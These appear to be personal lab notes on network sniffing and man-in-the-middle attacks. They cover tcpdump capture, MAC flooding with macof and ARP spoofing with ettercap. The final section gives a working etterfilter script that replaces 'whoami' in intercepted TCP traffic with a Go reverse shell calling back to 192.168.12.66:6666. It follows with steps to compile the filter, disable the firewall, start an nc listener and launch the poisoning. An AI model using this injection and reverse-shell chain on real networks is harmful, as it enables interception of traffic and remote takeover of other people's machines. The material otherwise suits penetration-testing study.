
Look Adapter:
```bash
ip address show eth1

```

Tcpdump in the eth1:
```bash
tcpdump -A -i eth1

```

Tcpdump save in a file:

```bash
tcpdump -A -i eth1 -w /tmp/tcpdump.pcap

```

Transfer the packet capture using scp:

```
scp admin@10.10.111.60:/tmp/tcpdump.pcap .
wireshark tcpdump.pcap
```

## Sniffing while MAC Flooding

```
tcpdump -A -i eth1 -w /tmp/tcpdump2.pcap
```


**macof**  floods  the  local network with random MAC addresses (causing some switches to fail  open in repeating mode, facilitating sniffing)

```
macof -i eth1

```

transfer the **pcap** to your machine

```
scp admin@10.10.111.60:/tmp/tcpdump2.pcap .   wireshark tcpdump2.pcap
```

### Man-in-the-Middle: Sniffing

![[Pasted image 20221120154936.png]]

```
ettercap -T -i eth1 -M arp
```

> nano whoami.ecf

if (ip.proto == TCP && tcp.src == 4444 && search(DATA.data, "whoami") ) {  
    log(DATA.data, "/root/ettercap.log");  
    replace("whoami", "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"192.168.12.66:6666\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go &" );  
    msg("###### ETTERFILTER: substituted 'whoami' with reverse shell. ######\n");  
}

_compile:_

> etterfilter whoami.ecf -o whoami.ef

_Disable the firewall:_

> ufw disable

start your listener (backgrounded):

> nc -nvlp 6666 &

Another shell run:

> sudo ettercap -T -i eth1 -M arp -F whoami.ef

When you receive:

![](https://miro.medium.com/max/599/1*G3Cdh610LDcmwzO167uF7A.png)

write in up shell:

> fg

and:

> nc -lvnp 6666 &